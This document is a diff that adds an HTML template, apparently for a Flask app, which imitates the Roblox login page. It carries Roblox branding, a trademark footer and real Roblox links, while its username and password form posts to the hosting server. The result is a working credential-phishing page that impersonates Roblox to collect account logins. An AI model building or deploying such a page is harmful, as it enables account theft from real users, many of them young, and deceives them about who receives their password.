@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Login - Roblox</title>
+  <link rel="stylesheet" href="{{ url_for('static', filename='style1.css') }}">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" href="{{ url_for('static', filename='roblox.png') }}" type="image/png">
+</head>
+<body class="login-page">
+  <div class="login-container">
+    <img src="{{ url_for('static', filename='roblox.png') }}" alt="Roblox Logo" class="roblox-logo">
+
+    <div class="login-box">
+      <h2 class="login-header">Login to Roblox</h2>
+
+      {% if error %}
+        <p class="error">{{ error }}</p>
+      {% endif %}
+
+      <form method="POST">
+        <input type="text" name="username" placeholder="Username/Email/Phone" required>
+        <input type="password" name="password" placeholder="Password" required>
+        <button type="submit" class="login-btn">Log In</button>
+      </form>
+
+      <a class="forgot" href="https://www.roblox.com/login/forgot-password-or-username" >Forgot Password or Username? </a>
+
+      <div class="divider">or</div>
+
+      <button class="device-btn">Another Logged In Device</button>
+
+      <p class="signup-text">Don't have an account? <a href="https://www.roblox.com/CreateAccount?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fusers%2F7962484643%2Fprofile">Sign Up</a></p>
+    </div>
+     <p style="font-size: 10px;
+              color: gray;
+              max-width: 500px;
+              width: 390px;
+              margin-left: 20px;">
+  ©2025 Roblox Corporation. Roblox, the Roblox logo and Powering Imagination are among our registered and unregistered trademarks in the U.S. and other countries.
+</p>
+  </div>
+  
+</body>
+</html>
